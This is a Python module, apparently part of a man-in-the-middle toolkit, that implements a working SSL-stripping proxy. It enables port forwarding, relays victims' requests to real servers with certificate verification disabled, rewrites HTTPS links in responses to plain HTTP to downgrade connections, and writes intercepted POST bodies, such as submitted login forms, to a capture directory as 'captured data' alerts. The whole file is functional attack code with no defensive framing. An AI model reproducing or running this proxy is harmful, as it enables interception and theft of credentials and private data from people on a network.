import socket
import ssl
import threading
import re
import uuid
import time
from . import STATUS, STOP_EVENT, SSL_STRIP_PORT, CAPTURE_DIR
from .utils import log_msg, set_port_forwarding

def handle_client_connection(client_socket):
    try:
        request_data = client_socket.recv(4096)
        if not request_data: return
        
        # Extract Host
        host = None
        try:
            headers = request_data.decode('utf-8', errors='ignore').split('\r\n')
            for line in headers:
                if line.lower().startswith("host:"):
                    host = line.split(" ")[1].strip()
                    break
        except: pass

        if host:
            # Connect to real server
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                server_sock = socket.create_connection((host, 443), timeout=4)
                secure_sock = context.wrap_socket(server_sock, server_hostname=host)
            except:
                secure_sock = socket.create_connection((host, 80), timeout=4)

            with secure_sock:
                # Strip Headers
                mod_req = re.sub(rb'Accept-Encoding:.*?\r\n', b'', request_data)
                mod_req = mod_req.replace(b'Connection: keep-alive', b'Connection: close')
                secure_sock.sendall(mod_req)
                
                # Get Response & Strip Links
                response_data = b""
                while True:
                    chunk = secure_sock.recv(4096)
                    if not chunk: break
                    response_data += chunk
                
                stripped_response = response_data.replace(b'https://', b'http://')
                
                # Log Credentials
                # ... inside handle_client_connection ...
                if b"POST " in request_data:
                    # NEW NAMING
                    timestamp_id = time.strftime('%H%M%S')
                    clean_host = host.replace('.', '-') if host else "unknown"
                    pkt_id = f"{timestamp_id}_SSL_{clean_host}"

                    # Try to extract body... (keep existing logic)
                    try:
                        header, body = request_data.split(b'\r\n\r\n', 1)
                        snippet = body.decode('utf-8', errors='ignore')
                    except:
                        snippet = request_data[:100].decode('utf-8', errors='ignore')

                    with open(f"{CAPTURE_DIR}/{pkt_id}.html", "wb") as f: f.write(request_data)
                    
                    STATUS["intercepted_data"].append({
                        "id": pkt_id, "time": time.strftime('%H:%M:%S'),
                        "src": "SSL_STRIP", "dst": host,
                        "snippet": f"[POST] {snippet}", "type": "ALERT"
                    })
                    log_msg(f"[ALERT] SSL STRIP Data Captured for {host}")

                client_socket.sendall(stripped_response)
    except: pass
    finally: client_socket.close()

def run_ssl_strip():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('0.0.0.0', SSL_STRIP_PORT))
        server.listen(50)
        log_msg(f"[+] SSL Proxy listening on port {SSL_STRIP_PORT}")
        set_port_forwarding(True)
        server.settimeout(1.0)
        
        while not STOP_EVENT.is_set():
            try:
                client, addr = server.accept()
                threading.Thread(target=handle_client_connection, args=(client,), daemon=True).start()
            except socket.timeout: continue
    except Exception as e: log_msg(f"SSL ERROR: {e}")
    finally:
        set_port_forwarding(False)
        server.close()